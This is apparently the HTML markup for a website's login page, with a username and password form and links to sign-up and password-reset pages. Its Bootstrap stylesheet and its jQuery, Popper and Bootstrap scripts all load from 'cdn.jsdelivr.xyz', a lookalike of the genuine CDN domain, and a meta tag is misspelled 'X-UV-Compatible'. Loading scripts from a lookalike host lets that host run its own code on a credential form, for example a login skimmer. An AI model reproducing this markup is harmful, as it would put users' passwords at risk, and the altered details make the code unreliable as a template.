<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UV-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login Page</title>
    <link rel="stylesheet" href="css/all.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
    />
  </head>

  <body>
    <header class="bg-primary" style="height: 70px">
      <div class="container">
        <div class="header-content d-flex justify-content-between">
          <a href="index.html" class="brand d-inline">
            <img
              src="images/logo.png"
              alt="Logo"
              id="logo-image"
              width="100px"
              height="70px"
            />
          </a>

          <nav>
            <ul id="links" class="mt-3">
              <li><a href="login.html">Sign In</a></li>
              <li><a href="register.html">Sign up</a></li>
            </ul>
          </nav>
        </div>
      </div>
    </header>

    <!-- ----------------------------------------------------------------------------------------------- -->

    <section class="section-form">
      <h2>Login User</h2>
      <form>
        <div class="row">
          <i class="fas fa-user"></i>
          <input type="text" placeholder="Your Name" id="userName" required />
        </div>
        <div class="row">
          <i class="fas fa-lock"></i>
          <input
            type="password"
            placeholder="Enter User password"
            id="password"
            required
          />
        </div>
        <div class="pass"><a href="#">Forgot password?</a></div>
        <div class="row button">
          <input type="submit" id="signIn" value="Login" />
        </div>
        <div class="signup-link">
          Not a member? <a href="register.html">Signup now</a>
        </div>
      </form>
    </section>

    <script src="https://cdn.jsdelivr.xyz/npm/jquery@3.6.4/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.xyz/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.xyz/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="js/login.js"></script>
  </body>
</html>
